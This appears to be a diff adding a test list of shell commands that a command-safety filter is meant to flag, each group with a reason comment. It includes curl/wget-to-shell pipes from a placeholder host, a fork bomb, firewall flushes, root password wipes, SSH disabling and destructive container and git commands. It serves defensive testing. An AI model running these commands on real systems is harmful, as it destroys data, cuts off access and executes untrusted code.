+false || reboot
+# reason: shutdown after true;
+true; shutdown -h now
+# reason: systemctl equivalent with sudo and --force
+sudo systemctl --force poweroff
+# reason: reboot inside backquotes
+echo `reboot`
+# reason: shutdown after a chained sleep
+sleep 1 && systemctl poweroff
+# reason: kill all processes with -s and --
+kill -s SIGKILL -- -1
+# reason: kill the graphical session
+pkill -9 gnome-shell
+# reason: fork bomb with a normal function name
+bomb(){ bomb|bomb& }; bomb
+# reason: wget -qO- to bash with sudo
+wget -qO- http://x.io/i.sh | sudo bash
+# reason: source of something downloaded with wget
+source <(wget -O - https://x.io/env.sh)
+# reason: . (dot) of something downloaded with curl
+. <(curl -sL x.io/a)
+# reason: python3 -c with downloaded code
+python3 -c "$(curl -fsSL https://x.io/p.py)"
+# reason: curl to python3 reading from stdin
+curl -s https://x.io/p.py | python3 -
+# reason: curl to perl
+curl https://x.io/p.pl | perl
+# reason: sh -c with a wget download
+sh -c "$(wget -qO- https://x.io/install)"
+# reason: curl to sudo -E bash -s with arguments
+curl -sSL https://x.io | sudo -E bash -s -- --yes
+# reason: wget to env bash
+wget -O - https://x.io | env bash
+# reason: curl with an intermediate tee to bash
+curl x.io/s | tee /tmp/s.sh | bash
+# reason: eval of something downloaded
+eval "$(curl -s https://x.io/env)"
+# reason: zsh -c with downloaded code
+zsh -c "$(curl -fsSL https://x.io/omz.sh)"
+# reason: curl to ruby
+curl -s https://x.io/i.rb | ruby
+# reason: download and run inside an assignment with substitution
+x=$(curl -fsSL https://x.io/i.sh | bash)
+# reason: flush rules with a long option and sudo
+sudo iptables --flush
+# reason: reset the ufw firewall
+ufw --force reset
+# reason: bring an interface down with ifconfig
+ifconfig eth0 down
+# reason: disable SSH with --now and sudo
+sudo systemctl disable --now ssh.service
+# reason: mask D-Bus
+systemctl mask dbus
+# reason: emergency mode
+systemctl emergency
+# reason: reset --hard with -C before the subcommand
+git -C ~/repo reset --hard HEAD~3
+# reason: reset --hard with a -c config option before the subcommand
+git -c core.pager=cat reset --hard
+# reason: filter-branch
+git filter-branch --tree-filter 'rm -f secreto' HEAD
+# reason: full system prune with volumes
+docker system prune -a --volumes -f
+# reason: forced removal of all images
+docker rmi -f $(docker images -q)
+# reason: full system prune with podman
+podman system prune --all --force
+# reason: kubectl delete of a namespace
+kubectl delete ns production
+# reason: kubectl delete with -n before the verb and --all
+kubectl -n prod delete all --all
+# reason: delete root's crontab with sudo and -u
+sudo crontab -u root -r
+# reason: delete a user
+userdel -r manuel
+# reason: delete a group
+groupdel docker
+# reason: change root's password through a pipe
+echo 'root:1234' | chpasswd
+# reason: delete a user with deluser and sudo
+sudo deluser --remove-home bob
+# reason: uninstall systemd
+apt-get remove -y systemd
+# reason: uninstall the SSH server
+sudo apt purge openssh-server
+# reason: ignore dependencies when uninstalling the kernel
+pacman -Rdd linux
+# reason: rpm --nodeps on bash
+rpm -e --nodeps bash
+# reason: dpkg --force-depends on coreutils
+dpkg --purge --force-depends coreutils
+# reason: uninstall the boot loader
+yum -y erase grub2
+# reason: rsync --delete into the home directory
+rsync -a --delete vacio/ ~/
+# reason: rsync --del abbreviation
+rsync -av --del src/ dst/
+# reason: --delete-after variant to another machine
+rsync -a --delete-after /src/ host:/dst/
+
+# ---- Rules added after the adversarial review (R7d, R15 ifconfig, R20 chpasswd) ----
+# reason: R7d sed -i with a suffix and sudo on /etc/shadow
+sudo sed -i.bak 's/^root:[^:]*:/root::/' /etc/shadow
+# reason: R7d sed --in-place with env and an absolute path on /etc/fstab
+env LC_ALL=C /bin/sed --in-place '/home/d' /etc/fstab
+# reason: R7d perl -pi on /etc/hosts
+perl -pi -e 's/127.0.0.1/0.0.0.0/' /etc/hosts
+# reason: R7d gawk -i inplace on /etc/passwd
+gawk -i inplace '!/^bob:/' /etc/passwd
+# reason: R15 ifconfig with sudo and an absolute path brings the interface down
+sudo /sbin/ifconfig wlan0 down
+# reason: R15 ifconfig removes the interface address
+ifconfig eth0 0.0.0.0
+# reason: R15 ifconfig deletes an address
+ifconfig eth0 inet6 del fe80::1/64
+# reason: R20 chpasswd with sudo and printf with the password in a variable
+printf 'root:%s\n' "$PW" | sudo chpasswd
+# reason: R20 chpasswd with a here-string
+chpasswd <<< 'root:secreto'
+# reason: R20 chpasswd with several accounts via echo -e, root included
+echo -e 'bob:uno\nroot:dos' | chpasswd
+# reason: R15 nmcli disconnecting an interface (like ip link set IF down)
+nmcli device disconnect enp0s31f6
+nmcli dev disconnect wlan0
+nmcli d disconnect eth0
+nmcli dev dis eth0
+nmcli device down wlan0
+nmcli -w 10 device disconnect eth0
+sudo nmcli device disconnect eth0
+# reason: R15 nmcli turning the radio off (like nmcli networking off, for wireless)
+nmcli radio wifi off
+nmcli radio all off
+nmcli r wifi off
+nmcli radio wwan off
+nmcli n off
+# reason: R15 nmcli bringing a connection down (it may be the one giving access)
+nmcli connection down vpn
+nmcli con down 'Wired connection 1'
+nmcli c down eth0
+nmcli c d eth0
+# reason: R18 compose down -v with options before down (-f, -p) or with podman: removes volumes all the same
+docker compose -f /opt/gitea/docker-compose.yml down -v
+docker compose -p monitoring down -v --rmi all
+docker compose -f ~/docker/nextcloud/docker-compose.yml down -v --remove-orphans
+docker compose --project-name wordpress down --volumes
+docker-compose -f compose.prod.yml down -v
+podman compose -f ~/stacks/gitea/compose.yaml down -v
+sudo docker compose -f /srv/nextcloud/docker-compose.yml down -v
+# reason: R18 forced removal of all containers or images with --all (like rm -f $(… ps -aq))
+podman rm -af
+podman rm -a -f
+podman rm --all --force
+podman container rm -af
+podman rmi -af
+podman image rm --all --force
+# reason: R15 nft flushing a table or a chain (like iptables -F/-X)
+nft flush table inet filter
+sudo nft flush table inet filter
+nft flush chain inet filter input
+nft delete chain inet filter input
+# reason: R15 firewall-cmd resetting a zone to its defaults (resets the firewall, like ufw reset)
+firewall-cmd --permanent --load-zone-defaults=public
+sudo firewall-cmd --permanent --load-zone-defaults=public && sudo firewall-cmd --reload
+firewall-cmd --load-zone-defaults public
+sudo firewall-cmd --reset-to-defaults
+firewall-cmd --reset-to-defaults && firewall-cmd --reload
